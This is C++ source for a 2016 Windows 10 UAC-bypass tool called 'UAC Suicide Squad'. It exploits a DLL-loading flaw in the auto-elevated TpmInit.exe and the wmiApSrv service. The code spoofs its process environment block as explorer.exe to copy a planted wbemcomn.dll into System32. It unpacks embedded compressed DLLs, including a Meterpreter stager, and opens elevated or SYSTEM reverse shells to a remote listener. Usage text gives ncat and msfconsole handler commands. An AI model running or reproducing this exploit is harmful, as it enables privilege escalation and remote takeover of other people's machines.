/*
   ______                ____      _ __
  /_  __/___  ____ ___  /  _/___  (_) /_
   / / / __ \/ __ `__ \ / // __ \/ / __/
  / / / /_/ / / / / / // // / / / / /_
 /_/ / .___/_/ /_/ /_/___/_/ /_/_/\__/
    /_/
               UAC Suicide Squad v1.1
	   Windows 10 Anniversary Edition
                      By Cn33liz 2016

A tool to Bypass User Account Control (UAC), to get a High Integrity (or SYSTEM) Reversed Command shell,
a reversed PowerShell session, or a Reversed Meterpreter session.
When TpmInit.exe starts, it first tries to load the wbemcomn.dll within C:\Windows\System32\wbem.
This DLL cannot be found in that folder, so it tries to load the DLL again, but then in C:\Windows\System32.
This tool exploits this DLL loading vulnerability within TpmInit.exe, which runs auto-elevated by default.
Same issue also applies to the WMI Performance Adapter service (wmiApSrv) which runs with SYSTEM privileges.
So while we can use TpmInit.exe to get Elevated priviliges, we can also use it to start the wmiApSrv service,
and get a SYSTEM shell using our custom DLL :)

This version only works on Windows 10 x64 with the Anniversary Update applied (Version 1607).
*/

#include "stdafx.h"

#define _WINSOCK_DEPRECATED_NO_WARNINGS

#pragma comment(lib, "ws2_32")
#pragma comment(lib, "crypt32.lib") 
#pragma comment(lib, "Cabinet.lib")

#include <winsock2.h>
#include <cstdio>
#include <Windows.h>
#include <string>
#include <stdio.h>
#include <tlhelp32.h>
#include <VersionHelpers.h>
#include <compressapi.h>
#include <wincrypt.h>
#include <Shobjidl.h>


void Usage(LPWSTR lpProgram) {
	wprintf(L" [>] Usage: First setup a remote Netcat, Ncat or Meterpreter(x64) listener\n");
	wprintf(L" [>] Example: KickAss@PenTestBox:~$ sudo ncat -lvp 443\n\n");
	wprintf(L" [>] Or for msf: KickAss@PenTestBox:~$ sudo msfconsole\n");
	wprintf(L" [>] msf > use exploit/multi/handler\n");
	wprintf(L" [>] msf exploit(handler) > set payload windows/x64/meterpreter/reverse_tcp\n");
	wprintf(L" [>] msf exploit(handler) > set LHOST 10.0.0.1\n");
	wprintf(L" [>] msf exploit(handler) > set LPORT 443\n");
	wprintf(L" [>] msf exploit(handler) > exploit -j\n\n");

	wprintf(L" [>] Then on your target: %s <Remote Listener IP> <Port> <powershell, cmd or msf> <system>\n\n", lpProgram);
	wprintf(L" [>] Example1: Remote Elevated Cmd Shell:   %s 10.0.0.1 443 cmd\n", lpProgram);
	wprintf(L" [>] Example2: Remote SYSTEM Cmd Shell:     %s 10.0.0.1 443 cmd system\n", lpProgram);
	wprintf(L" [>] Example3: Remote Elevated PowerShell:  %s 10.0.0.1 443 powershell\n", lpProgram);
	wprintf(L" [>] Example4: Remote SYSTEM PowerShell:    %s 10.0.0.1 443 powershell system\n", lpProgram);
	wprintf(L" [>] Example5: Remote Elevated Meterpreter: %s 10.0.0.1 443 msf\n", lpProgram);
	wprintf(L" [>] Example6: Remote SYSTEM Meterpreter:   %s 10.0.0.1 443 msf system\n\n", lpProgram);
}

BOOL MasqueradePEB() {
	/* Masquerade our process PEB structure to give it the appearance of a different process.
	   We can use this to perform an elevated file copy using COM, without the need to inject a DLL into explorer.exe.
	   We basicly fool the COM IFileOperation Object (which is relying on the Process Status API (PSAPI) to check for process identity) 
	   into thinking it is called from the Windows Explorer Shell.

	   This function is based on the Bypass-UAC.ps1 code from @FuzzySec (b33f):
	   * https://github.com/FuzzySecurity/PowerShell-Suite/blob/master/Bypass-UAC/Bypass-UAC.ps1
	   Which is basically a reimplementation of two functions in the UACME bypass code from @hFireF0X:
	   * supMasqueradeProcess: https://github.com/hfiref0x/UACME/blob/master/Source/Akagi/sup.c#L504
	   * supxLdrEnumModulesCallback: https://github.com/hfiref0x/UACME/blob/master/Source/Akagi/sup.c#L477

	   The following links helped me a lot understanding the structures e.g:
	   * @rwfpl's terminus project: http://terminus.rewolf.pl/terminus/structures/ntdll/_PEB_combined.html
	   * Kernel-Mode Basics: Windows Linked Lists: http://www.osronline.com/article.cfm?article=499 
	*/

	typedef struct _UNICODE_STRING {
		USHORT Length;
		USHORT MaximumLength;
		PWSTR  Buffer;
	} UNICODE_STRING, *PUNICODE_STRING;

	typedef NTSTATUS(NTAPI *_NtQueryInformationProcess)(
		HANDLE ProcessHandle,
		DWORD ProcessInformationClass,
		PVOID ProcessInformation,
		DWORD ProcessInformationLength,
		PDWORD ReturnLength
		);

	typedef NTSTATUS(NTAPI *_RtlEnterCriticalSection)(
		PRTL_CRITICAL_SECTION CriticalSection
		);

	typedef NTSTATUS(NTAPI *_RtlLeaveCriticalSection)(
		PRTL_CRITICAL_SECTION CriticalSection
		);

	typedef void (WINAPI* _RtlInitUnicodeString)(
		PUNICODE_STRING DestinationString,
		PCWSTR SourceString
		);

	typedef struct _LIST_ENTRY {
		struct _LIST_ENTRY  *Flink;
		struct _LIST_ENTRY  *Blink;
	} LIST_ENTRY, *PLIST_ENTRY;

	typedef struct _PROCESS_BASIC_INFORMATION
	{
		LONG ExitStatus;
		PVOID PebBaseAddress;
		ULONG_PTR AffinityMask;
		LONG BasePriority;
		ULONG_PTR UniqueProcessId;
		ULONG_PTR ParentProcessId;
	} PROCESS_BASIC_INFORMATION, *PPROCESS_BASIC_INFORMATION;

	typedef struct _PEB_LDR_DATA {
		ULONG Length;
		BOOLEAN Initialized;
		HANDLE SsHandle;
		LIST_ENTRY InLoadOrderModuleList;
		LIST_ENTRY InMemoryOrderModuleList;
		LIST_ENTRY InInitializationOrderModuleList;
		PVOID EntryInProgress;
		BOOLEAN ShutdownInProgress;
		HANDLE ShutdownThreadId;
	} PEB_LDR_DATA, *PPEB_LDR_DATA;

	typedef struct _RTL_USER_PROCESS_PARAMETERS {
		BYTE           Reserved1[16];
		PVOID          Reserved2[10];
		UNICODE_STRING ImagePathName;
		UNICODE_STRING CommandLine;
	} RTL_USER_PROCESS_PARAMETERS, *PRTL_USER_PROCESS_PARAMETERS;

	// Partial PEB
	typedef struct _PEB {
		BOOLEAN InheritedAddressSpace;
		BOOLEAN ReadImageFileExecOptions;
		BOOLEAN BeingDebugged;
		union
		{
			BOOLEAN BitField;
			struct
			{
				BOOLEAN ImageUsesLargePages : 1;
				BOOLEAN IsProtectedProcess : 1;
				BOOLEAN IsLegacyProcess : 1;
				BOOLEAN IsImageDynamicallyRelocated : 1;
				BOOLEAN SkipPatchingUser32Forwarders : 1;
				BOOLEAN SpareBits : 3;
			};
		};
		HANDLE Mutant;

		PVOID ImageBaseAddress;
		PPEB_LDR_DATA Ldr;
		PRTL_USER_PROCESS_PARAMETERS ProcessParameters;
		PVOID SubSystemData;
		PVOID ProcessHeap;
		PRTL_CRITICAL_SECTION FastPebLock;
	} PEB, *PPEB;

	typedef struct _LDR_DATA_TABLE_ENTRY {
		LIST_ENTRY InLoadOrderLinks;
		LIST_ENTRY InMemoryOrderLinks;
		union
		{
			LIST_ENTRY InInitializationOrderLinks;
			LIST_ENTRY InProgressLinks;
		};
		PVOID DllBase;
		PVOID EntryPoint;
		ULONG SizeOfImage;
		UNICODE_STRING FullDllName;
		UNICODE_STRING BaseDllName;
		ULONG Flags;
		WORD LoadCount;
		WORD TlsIndex;
		union
		{
			LIST_ENTRY HashLinks;
			struct
			{
				PVOID SectionPointer;
				ULONG CheckSum;
			};
		};
		union
		{
			ULONG TimeDateStamp;
			PVOID LoadedImports;
		};
	} LDR_DATA_TABLE_ENTRY, *PLDR_DATA_TABLE_ENTRY;

	DWORD dwPID;
	PROCESS_BASIC_INFORMATION pbi;
	PPEB peb;
	PPEB_LDR_DATA pld;
	PLDR_DATA_TABLE_ENTRY ldte;

	_NtQueryInformationProcess NtQueryInformationProcess = (_NtQueryInformationProcess)
		GetProcAddress(GetModuleHandle(L"ntdll.dll"), "NtQueryInformationProcess");
	if (NtQueryInformationProcess == NULL) {
		return FALSE;
	}

	_RtlEnterCriticalSection RtlEnterCriticalSection = (_RtlEnterCriticalSection)
		GetProcAddress(GetModuleHandle(L"ntdll.dll"), "RtlEnterCriticalSection");
	if (RtlEnterCriticalSection == NULL) {
		return FALSE;
	}

	_RtlLeaveCriticalSection RtlLeaveCriticalSection = (_RtlLeaveCriticalSection)
		GetProcAddress(GetModuleHandle(L"ntdll.dll"), "RtlLeaveCriticalSection");
	if (RtlLeaveCriticalSection == NULL) {
		return FALSE;
	}

	_RtlInitUnicodeString RtlInitUnicodeString = (_RtlInitUnicodeString)
		GetProcAddress(GetModuleHandle(L"ntdll.dll"), "RtlInitUnicodeString");
	if (RtlInitUnicodeString == NULL) {
		return FALSE;
	}

	dwPID = GetCurrentProcessId();
	HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_VM_OPERATION, FALSE, dwPID);
	if (hProcess == INVALID_HANDLE_VALUE)
	{
		return FALSE;
	}

	// Retrieves information about the specified process.
	NtQueryInformationProcess(hProcess, 0, &pbi, sizeof(pbi), NULL);

	// Read pbi PebBaseAddress into PEB Structure
	if (!ReadProcessMemory(hProcess, &pbi.PebBaseAddress, &peb, sizeof(peb), NULL)) {
		return FALSE;
	}

	// Read Ldr Address into PEB_LDR_DATA Structure
	if (!ReadProcessMemory(hProcess, &peb->Ldr, &pld, sizeof(pld), NULL)) {
		return FALSE;
	}

	// Let's overwrite UNICODE_STRING structs in memory

	// First set Explorer.exe location buffer
	WCHAR chExplorer[MAX_PATH + 1];
	GetWindowsDirectory(chExplorer, MAX_PATH);
	wcscat_s(chExplorer, sizeof(chExplorer) / sizeof(wchar_t), L"\\explorer.exe");

	LPWSTR pwExplorer = (LPWSTR)malloc(MAX_PATH);
	wcscpy_s(pwExplorer, MAX_PATH , chExplorer);

	// Take ownership of PEB
	RtlEnterCriticalSection(peb->FastPebLock);

	// Masquerade ImagePathName and CommandLine 
	RtlInitUnicodeString(&peb->ProcessParameters->ImagePathName, pwExplorer);
	RtlInitUnicodeString(&peb->ProcessParameters->CommandLine, pwExplorer);

	// Masquerade FullDllName and BaseDllName
	WCHAR wFullDllName[MAX_PATH];
	WCHAR wExeFileName[MAX_PATH];	
	GetModuleFileName(NULL, wExeFileName, MAX_PATH);

	LPVOID pStartModuleInfo = peb->Ldr->InLoadOrderModuleList.Flink;
	LPVOID pNextModuleInfo = pld->InLoadOrderModuleList.Flink;
	do
	{
		// Read InLoadOrderModuleList.Flink Address into LDR_DATA_TABLE_ENTRY Structure
		if (!ReadProcessMemory(hProcess, &pNextModuleInfo, &ldte, sizeof(ldte), NULL)) {
			return FALSE;
		}

		// Read FullDllName into string
		if (!ReadProcessMemory(hProcess, (LPVOID)ldte->FullDllName.Buffer, (LPVOID)&wFullDllName, ldte->FullDllName.MaximumLength, NULL))
		{
			return FALSE;
		}

		if (_wcsicmp(wExeFileName, wFullDllName) == 0) {
			RtlInitUnicodeString(&ldte->FullDllName, pwExplorer);
			RtlInitUnicodeString(&ldte->BaseDllName, pwExplorer);
			break;
		}

		pNextModuleInfo = ldte->InLoadOrderLinks.Flink;

	} while (pNextModuleInfo != pStartModuleInfo);

	//Release ownership of PEB
	RtlLeaveCriticalSection(peb->FastPebLock);

	// Release Process Handle
	CloseHandle(hProcess);

	if (_wcsicmp(chExplorer, wFullDllName) == 0) {
		return FALSE;
	}

	return TRUE;
}

BOOL UACBypassCopy() {
		IFileOperation *fileOperation = NULL;
		WCHAR dllPath[1024];
		LPCWSTR dllName = L"wbemcomn.dll";

		GetModuleFileName(NULL, dllPath, 1024);
		std::wstring path(dllPath);
		const size_t last = path.rfind('\\');
		if (std::wstring::npos != last)
		{
			path = path.substr(0, last + 1);
		}
		path += dllName;

		// First Masquerade our Process as Explorer.exe 
		if (!MasqueradePEB()) {
			wprintf(L" -> Oops PEB masquerading failed!\n");
			exit(1);
		}
		
		wprintf(L" -> Done!\n");
		wprintf(L" [*] And use the IFileOperation::CopyItem method to copy our DLL");

		LPCWSTR destPath = L"C:\\windows\\System32\\wbem";
		BIND_OPTS3 bo;
		SHELLEXECUTEINFOW shexec;

		HRESULT hr = CoInitializeEx(NULL, COINIT_APARTMENTTHREADED | COINIT_DISABLE_OLE1DDE);
		if (SUCCEEDED(hr)) {
			memset(&shexec, 0, sizeof(shexec));
			memset(&bo, 0, sizeof(bo));
			bo.cbStruct = sizeof(bo);
			bo.dwClassContext = CLSCTX_LOCAL_SERVER;
			hr = CoGetObject(L"Elevation:Administrator!new:{3ad05575-8857-4850-9277-11b85bdb8e09}", &bo, __uuidof(IFileOperation), (PVOID*)&fileOperation);
			if (SUCCEEDED(hr)) {
				hr = fileOperation->SetOperationFlags(
					FOF_NOCONFIRMATION |
					FOF_SILENT |
					FOFX_SHOWELEVATIONPROMPT |
					FOFX_NOCOPYHOOKS |
					FOFX_REQUIREELEVATION |
					FOF_NOERRORUI);
				if (SUCCEEDED(hr)) {
					IShellItem *from = NULL, *to = NULL;
					hr = SHCreateItemFromParsingName(path.data(), NULL, IID_PPV_ARGS(&from));
					if (SUCCEEDED(hr)) {
						if (destPath)
							hr = SHCreateItemFromParsingName(destPath, NULL, IID_PPV_ARGS(&to));
						if (SUCCEEDED(hr)) {
							hr = fileOperation->CopyItem(from, to, dllName, NULL);
							if (NULL != to)
								to->Release();
						}
						from->Release();
					}
					if (SUCCEEDED(hr)) {
						hr = fileOperation->PerformOperations();
					}
				}
				fileOperation->Release();
			}
			CoUninitialize();
		}
		
		return TRUE;
}

BOOL CheckValidIpAddr(LPCSTR lpIpAddr) {
	unsigned long ulAddr = INADDR_NONE;

	ulAddr = inet_addr(lpIpAddr);
	if (ulAddr == INADDR_NONE) {
		return FALSE;
	}

	if (ulAddr == INADDR_ANY) {
		return FALSE;
	}

	return TRUE;
}

BOOL Base64DecodeAndDecompressDLL(CHAR *Buffer, LPCWSTR lpDecFile)
{
	BOOL Success;
	DECOMPRESSOR_HANDLE Decompressor = NULL;
	PBYTE CompressedBuffer = NULL;
	PBYTE DecompressedBuffer = NULL;
	SIZE_T DecompressedBufferSize, DecompressedDataSize;
	DWORD ByteWritten, BytesRead;
	BOOL bErrorFlag = FALSE;


	// Base64 decode our Buffer.
	DWORD dwSize = 0;
	DWORD strLen = lstrlenA(Buffer);

	CryptStringToBinaryA(Buffer, strLen, CRYPT_STRING_BASE64, NULL, &dwSize, NULL, NULL);

	dwSize++;
	CompressedBuffer = new BYTE[dwSize];
	CryptStringToBinaryA(Buffer, strLen, CRYPT_STRING_BASE64, CompressedBuffer, &dwSize, NULL, NULL);

	//  Create an LZMS decompressor.
	Success = CreateDecompressor(
		COMPRESS_ALGORITHM_LZMS,		//  Compression Algorithm
		NULL,                           //  Optional allocation routine
		&Decompressor);                 //  Handle

	if (!Success)
	{
		return FALSE;
	}

	//  Query decompressed buffer size.
	Success = Decompress(
		Decompressor,                //  Compressor Handle
		CompressedBuffer,            //  Compressed data
		dwSize,						 //  Compressed data size
		NULL,                        //  Buffer set to NULL
		0,                           //  Buffer size set to 0
		&DecompressedBufferSize);    //  Decompressed Data size

									 //  Allocate memory for decompressed buffer.
	if (!Success)
	{
		DWORD ErrorCode = GetLastError();

		// Note that the original size returned by the function is extracted 
		// from the buffer itself and should be treated as untrusted and tested
		// against reasonable limits.
		if (ErrorCode != ERROR_INSUFFICIENT_BUFFER)
		{
			return FALSE;
		}

		DecompressedBuffer = (PBYTE)malloc(DecompressedBufferSize);
		if (!DecompressedBuffer)
		{
			return FALSE;
		}
	}

	//  Decompress data and write data to DecompressedBuffer.
	Success = Decompress(
		Decompressor,               //  Decompressor handle
		CompressedBuffer,           //  Compressed data
		dwSize,						//  Compressed data size
		DecompressedBuffer,         //  Decompressed buffer
		DecompressedBufferSize,     //  Decompressed buffer size
		&DecompressedDataSize);     //  Decompressed data size

	if (!Success)
	{
		return FALSE;
	}

	HANDLE decFile = CreateFile(lpDecFile,
		GENERIC_WRITE,
		0,
		NULL,
		CREATE_ALWAYS,
		FILE_ATTRIBUTE_NORMAL,
		NULL);
	if (decFile == INVALID_HANDLE_VALUE) {
		return FALSE;
	}

	bErrorFlag = WriteFile(decFile, DecompressedBuffer, (DWORD)DecompressedDataSize, &ByteWritten, NULL);
	if (FALSE == bErrorFlag)
	{
		CloseHandle(decFile);
		return FALSE;
	}

	CloseHandle(decFile);

	return TRUE;
}


int wmain(int argc, wchar_t* argv[])
{
	WIN32_FIND_DATA FindFileData;
	HANDLE hFind;
	LPCWSTR dllName = L"C:\\Windows\\System32\\wbem\\wbemcomn.dll";

	wprintf(L"   ______           ____     _ __     \n");
	wprintf(L"  /_  __/__  __ _  /  _/__  (_) /_    \n");
	wprintf(L"   / / / _ \\/  ' \\_/ // _ \\/ / __/ \n");
	wprintf(L"  /_/ / .__/_/_/_/___/_//_/_/\\__/    \n");
	wprintf(L"     /_/                              \n");
	wprintf(L"          UAC Suicide Squad v1.1      \n");
	wprintf(L"  Windows 10 Anniversary Edition      \n");
	wprintf(L"                 By Cn33liz 2016      \n\n");

	if (argc < 4 || argc > 5) {
		Usage(argv[0]);
		exit(1);
	}
	else {

		LPWSTR lpListener = argv[1];
		DWORD dwPort = _wtoi(argv[2]);
		LPWSTR lpShell = CharLower(argv[3]);
		CHAR chIpAddress[32];
		LPWSTR lpSystem = L"";
		if (argc == 5) {
			lpSystem = CharLower(argv[4]);
		}

		size_t mblen = 0;
		wcstombs_s(&mblen, chIpAddress, sizeof(chIpAddress), argv[1], 16);
		if (!CheckValidIpAddr(chIpAddress)) {
			wprintf(L" [!] That's not a valid IP Address, please try again...\n\n");
			exit(1);
		}

		if (!(dwPort > 0 && dwPort <= 65535)) {
			wprintf(L" [!] That's not a valid port, please try again...\n\n");
			exit(1);
		}

		if ((_wcsicmp(L"powershell", lpShell) != 0) && (_wcsicmp(L"cmd", lpShell) != 0) && (_wcsicmp(L"msf", lpShell) != 0)) {
			wprintf(L" [!] That's not a valid shell, please try again...\n\n");
			exit(1);
		}

		if (argc == 5) {
			if (_wcsicmp(L"system", lpSystem) != 0) {
				wprintf(L" [!] That's not a valid argument, please try again...\n\n");
				exit(1);
			}
		}

		wprintf(L" [*] Dropping needed DLL's from memory");

		CHAR *WbemComn = WbemComnB64();
		if (!Base64DecodeAndDecompressDLL(WbemComn, L"wbemcomn.dll")) {
			wprintf(L" -> Oops something went wrong!\n");
			exit(1);
		}

		wprintf(L" -> Done!\n");

		wprintf(L" [*] Write parameters into config file");

		HANDLE hFile;
		WCHAR chTmpFile[MAX_PATH];
		TCHAR szParams[256];
		GetTempPath(MAX_PATH, chTmpFile);
		wcscat_s(chTmpFile, sizeof(chTmpFile) / sizeof(wchar_t), L"tmpBLABLA.tmp");

		hFile = CreateFile(chTmpFile, // Name of the write
			GENERIC_WRITE,            // Open for writing
			0,                        // Do not share
			NULL,                     // Default security
			CREATE_ALWAYS,            // Creates a new file, always.
			FILE_ATTRIBUTE_NORMAL,    // Normal file
			NULL);                    // No attr. template

		if (hFile == INVALID_HANDLE_VALUE)
		{
			wprintf(L" -> Oops something went wrong!\n");
			exit(1);
		}

		_sntprintf_s(szParams, sizeof(szParams) / sizeof(TCHAR), _TRUNCATE, L"%ls %i %ls %s", lpListener, dwPort, lpShell, lpSystem);

		mblen = 0;
		CHAR chParams[64];
		wcstombs_s(&mblen, chParams, sizeof(chParams), szParams, 64);

		DWORD dwBytesToWrite = (strlen(chParams) * sizeof(char)); // include the NULL terminator
		DWORD dwBytesWritten = 0;
		BOOL bErrorFlag = FALSE;

		bErrorFlag = WriteFile(
			hFile,            // Open file handle
			chParams,         // Start of data to write
			dwBytesToWrite,   // Number of bytes to write
			&dwBytesWritten,  // Number of bytes that were written
			NULL);            // No overlapped structure

		if (FALSE == bErrorFlag)
		{
			wprintf(L" -> Oops something went wrong!\n");
			exit(1);
		}

		CloseHandle(hFile);

		if (_wcsicmp(L"msf", lpShell) == 0) {
			LPCWSTR lpMsfdllName = L"MsfStager.dll";
			WCHAR chMsfFile[MAX_PATH];
			CHAR *MsfStager = MsfStagerB64();

			GetTempPath(MAX_PATH, chMsfFile);
			wcscat_s(chMsfFile, sizeof(chMsfFile) / sizeof(wchar_t), L"tmpMSFBLA.tmp");	
			if (!Base64DecodeAndDecompressDLL(MsfStager, chMsfFile)) {
				wprintf(L" -> Oops something went wrong!\n");
				exit(1);
			}
		}

		wprintf(L" -> Done!\n");
		
		wprintf(L" [*] Now Masquerade our Process (PEB) as Explorer.exe");
		UACBypassCopy();

		hFind = FindFirstFile(dllName, &FindFileData);
		if (hFind == INVALID_HANDLE_VALUE)
		{
			wprintf(L" -> Oops IFileOperation::CopyItem failed!\n");
			DeleteFile(L"wbemcomn.dll");
			return 1;
		}
		else
		{
			wprintf(L" -> Done!\n");
			FindClose(hFind);
		}

		if (_wcsicmp(L"system", lpSystem) == 0) {
			wprintf(L" [*] Let's use TpmInit.exe to start the wmiApSrv service, enable all privs and see if we get a session...\n");
		}
		else {
			wprintf(L" [*] Let's start TpmInit.exe, enable all privs and see if we get a session...\n");
		}

		ShellExecute(NULL, NULL, L"C:\\Windows\\System32\\TpmInit.exe", NULL, NULL, SW_HIDE);

		wprintf(L" [*] Have fun!\n\n");

		DeleteFile(L"wbemcomn.dll");

		return 0;
	}
}
